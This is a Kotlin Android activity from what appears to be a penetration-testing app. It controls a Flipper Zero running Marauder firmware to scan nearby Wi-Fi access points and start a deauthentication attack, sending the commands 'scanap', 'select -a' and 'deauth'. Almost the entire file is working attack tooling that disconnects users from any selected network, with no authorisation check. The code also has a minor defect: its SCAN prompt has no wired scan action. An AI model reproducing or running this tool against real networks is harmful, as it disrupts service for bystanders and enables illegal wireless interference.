package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.ListView
import android.widget.TextView
import android.widget.Toast
import android.widget.ProgressBar
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class WiFiDeauthActivity : AppCompatActivity() {

    private lateinit var networkList: ListView
    private lateinit var scanningText: TextView
    private lateinit var btnDeauth: MaterialButton
    private lateinit var btnStop: MaterialButton
    private lateinit var progressBar: ProgressBar

    private val networks = mutableListOf<String>()
    private lateinit var adapter: ArrayAdapter<String>
    private var selectedNetworkIndex: Int = -1
    private var isAttacking = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_wifi_deauth)

        ProcessManager.stopCurrentProcess(this)

        networkList = findViewById(R.id.networkList)
        scanningText = findViewById(R.id.scanningText)
        btnDeauth = findViewById(R.id.btnDeauth)
        btnStop = findViewById(R.id.btnStop)
        progressBar = findViewById(R.id.progressBar)

        adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, networks)
        networkList.adapter = adapter

        networkList.setOnItemClickListener { _, _, position, _ ->
            selectedNetworkIndex = position
            addLog("Selected network #$position: ${networks[position]}")
            btnDeauth.isEnabled = true
        }

        FlipperConnectionManager.setDataReceivedCallback { data ->
            runOnUiThread {
                parseMarauderResponse(data)
            }
        }

        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnDeauth.setOnClickListener {
            if (selectedNetworkIndex >= 0) {
                startDeauth()
            } else {
                Toast.makeText(this, "Select a network first", Toast.LENGTH_SHORT).show()
            }
        }

        btnStop.setOnClickListener {
            stopAttack()
        }

        addLog("=== WiFi Deauth via Flipper Marauder ===")
        addLog("Click SCAN to discover networks")
    }

    private fun scanNetworks() {
        if (!FlipperConnectionManager.isConnected()) {
            addLog("ERROR: Flipper not connected!")
            Toast.makeText(this, "Connect Flipper first", Toast.LENGTH_SHORT).show()
            return
        }

        networks.clear()
        adapter.notifyDataSetChanged()
        selectedNetworkIndex = -1
        btnDeauth.isEnabled = false

        addLog("")
        addLog("=== SCANNING WIFI NETWORKS ===")
        addLog("Sending 'scanap' to Marauder...")

        progressBar.visibility = View.VISIBLE

        FlipperConnectionManager.sendCommand("scanap")

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            progressBar.visibility = View.GONE
            if (networks.isEmpty()) {
                addLog("No networks found - check WiFi Dev Board")
            } else {
                addLog("Found ${networks.size} networks")
            }
        }, 10000)
    }

    private fun startDeauth() {
        if (!FlipperConnectionManager.isConnected()) {
            Toast.makeText(this, "Flipper not connected", Toast.LENGTH_SHORT).show()
            return
        }

        addLog("")
        addLog("=== STARTING DEAUTH ATTACK ===")
        addLog("Target: Network #$selectedNetworkIndex")

        progressBar.visibility = View.VISIBLE

        FlipperConnectionManager.sendCommand("select -a $selectedNetworkIndex")

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            addLog("Sending deauth command...")
            FlipperConnectionManager.sendCommand("deauth")

            isAttacking = true
            btnDeauth.isEnabled = false
            btnStop.isEnabled = true

            addLog("Attack started - Press STOP to end")
        }, 500)
    }

    private fun stopAttack() {
        addLog("")
        addLog("=== STOPPING ATTACK ===")

        FlipperConnectionManager.sendCommand("stopscan")

        progressBar.visibility = View.GONE
        isAttacking = false
        btnStop.isEnabled = false
        btnDeauth.isEnabled = selectedNetworkIndex >= 0

        addLog("Attack stopped")
    }

    private fun parseMarauderResponse(data: String) {
        addLog(data.trim())

        if (data.contains("SSID:", ignoreCase = true) || data.contains("ssid:", ignoreCase = true)) {
            val lines = data.split("\n")
            for (line in lines) {
                if (line.contains("SSID") || line.contains("CH:") || line.contains("RSSI")) {
                    if (!networks.contains(line.trim()) && line.trim().isNotEmpty()) {
                        networks.add(line.trim())
                        runOnUiThread {
                            adapter.notifyDataSetChanged()
                        }
                    }
                }
            }
        }

        if (data.contains("deauth", ignoreCase = true) &&
            (data.contains("sent", ignoreCase = true) || data.contains("attack", ignoreCase = true))) {
            addLog("âœ“ Deauth packets transmitted")
        }
    }

    private fun addLog(message: String) {
        val currentText = scanningText.text.toString()
        scanningText.text = if (currentText.isEmpty()) {
            message
        } else {
            "$currentText\n$message"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isAttacking) {
            FlipperConnectionManager.sendCommand("stopscan")
        }
    }
}
